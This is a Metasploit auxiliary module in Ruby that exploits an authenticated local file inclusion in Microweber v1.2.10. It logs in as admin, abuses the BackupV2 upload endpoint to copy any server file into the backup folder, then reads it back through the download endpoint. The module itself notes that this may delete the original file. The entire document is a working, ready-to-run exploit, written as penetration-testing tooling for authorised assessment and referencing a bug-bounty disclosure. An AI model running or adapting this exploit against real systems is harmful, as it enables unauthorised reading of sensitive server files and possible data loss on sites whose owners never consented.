##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking
  
  include Msf::Exploit::Remote::HttpClient
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microweber v1.2.10 Local File Inclusion (Authenticated)",
      'Description'    => %q{
        Microweber v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
        Upload function may delete the local file if the web service user has access.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Talha Karakumru <talhakarakumru[at]gmail.com>'
        ],
      'References'     =>
        [
          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
        ],
      'Notes'          =>
        {
          'SideEffects' => [ 'ARTIFACTS_ON_DISK', 'IOC_IN_LOGS' ],
          'Reliability' => [ 'REPEATABLE_SESSION' ],
          'Stability'   => [ 'OS_RESOURCE_LOSS' ]
        },
      'Targets'        =>
        [
          [ 'Microweber v1.2.10', {} ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "2022-01-30"
      ))
  
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
        OptString.new('ADMIN_USER', [true, 'The admin\'s username for Microweber']),
        OptString.new('ADMIN_PASS', [true, 'The admin\'s password for Microweber']),
        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
      ])
  end

  def check
    check_version ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end
  
  def check_version
    print_warning 'Triggering this vulnerability may delete the local file that is wanted to be read.'
    print_status 'Checking Microweber\'s version.'
  
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path, 'admin', 'login')
    })
  
    begin
      version = res.body[/Version:\s+\d+\.\d+\.\d+/].gsub(' ', '').gsub(':', ': ')
    rescue NoMethodError, TypeError
      return false
    end
  
    if version.include?('Version: 1.2.10')
      print_good 'Microweber ' + version
      return true
    end

    return false
  end
  
  def login
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'api', 'user_login'),
      'vars_post' => {
        'username' => datastore['ADMIN_USER'],
        'password' => datastore['ADMIN_PASS'],
        'lang' => '',
        'where_to' => 'admin_content'
      }
    })
  
    if res.headers['Content-Type'] == 'application/json'
      jsonRes = res.get_json_document
  
      if res.code != 200
        print_error 'Microweber cannot be reached.'
        return false
      end

      if !jsonRes['error'].nil?
        print_error jsonRes['error']
        return false
      end

      if !jsonRes['success'].nil? && jsonRes['success'] == 'You are logged in'
        print_good jsonRes['success']
        @cookie = res.get_cookies
        return true
      end

      print_error 'An unknown error occurred.'
      return false
    end

    print_status res.body
    return true  
  end
  
  def upload
    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
      'cookie'    => @cookie,
      'vars_get'  => {
        'src' => datastore['LOCAL_FILE_PATH']
      },
      'headers'   => {
        'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
      }
    })

    if res.headers['Content-Type'] == 'application/json'
      jsonRes = res.get_json_document

      if jsonRes['success']
        print_good jsonRes['success']
        return true
      end
    end

    print_error 'Either the file cannot be read or the file does not exist.'
    return false
  end

  def download
    filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
    print_status 'Downloading ' + filename + ' from the backup folder.'

    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
      'cookie'    => @cookie,
      'vars_get'  => {
        'filename' => filename
      },
      'headers'   => {
        'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
      }
    })

    if res.headers['Content-Type'] == 'application/json'
      jsonRes = res.get_json_document

      if jsonRes['error']
        print_error jsonRes['error']
        return
      end
    end

    print_status res.body
  end

  def run
    is_version_valid = check_version
    is_login_valid = login

    if !is_version_valid || !is_login_valid
      return
    end

    is_upload_successful = upload
    if is_upload_successful
      download
    end
  end
end
